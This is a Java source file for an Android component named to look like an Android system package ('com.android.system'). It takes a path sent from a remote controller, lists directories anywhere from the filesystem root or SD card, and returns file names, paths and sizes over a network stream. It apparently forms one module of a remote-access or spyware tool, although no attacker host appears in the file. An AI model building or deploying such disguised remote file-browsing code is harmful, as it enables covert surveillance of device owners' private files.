package com.android.system.session.handler;

import android.os.Environment;

import com.android.system.session.SessionManager;
import com.android.system.utils.DataPack;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;

public class FileListSessionHandler implements SessionManager.SessionHandler {
    @Override
    public void handleSession(JSONObject receiveJsonObject, InputStream inputStream, OutputStream outputStream)  {
        String path = "",rawPath = "";
        try {
            path = rawPath = receiveJsonObject.getString("path");
        } catch (JSONException e) {
            e.printStackTrace();
        }
        path = path.replace("<ROOT>", "/").replace("<SD>", Environment.getExternalStorageDirectory().getAbsolutePath());

        File filePath = new File(path);
        if(filePath.isDirectory()) {
            File[] fileList = filePath.listFiles();
            if (fileList == null || fileList.length == 0) {
                DataPack.sendDataPack(outputStream, new JSONObject().toString().getBytes());
                return;
            }
            try {
                JSONArray jsonArray = new JSONArray();
                for (File file : fileList) {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("name", file.getName());
                    jsonObject.put("path", file.getAbsolutePath());
                    jsonObject.put("type", file.isDirectory() ? 1 : 0);
                    jsonArray.put(jsonObject);
                }
                try {
                    DataPack.sendDataPack(outputStream, new JSONObject().put("path", rawPath).put("file_list", jsonArray).toString().getBytes("UTF-8"));
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                    DataPack.sendDataPack(outputStream, new JSONObject().put("path", rawPath).put("file_list", jsonArray).toString().getBytes());
                }
            } catch (JSONException e) {

            }
        } else if(filePath.isFile()) {
            try {
                try {
                    DataPack.sendDataPack(outputStream, new JSONObject().put("path", rawPath).put("length", filePath.length()).put("name", filePath.getName()).toString().getBytes("UTF-8"));
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                    DataPack.sendDataPack(outputStream, new JSONObject().put("path", rawPath).put("length", filePath.length()).put("name", filePath.getName()).toString().getBytes());
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }
        } else {
            DataPack.sendDataPack(outputStream, new JSONObject().toString().getBytes());
        }
    }
}
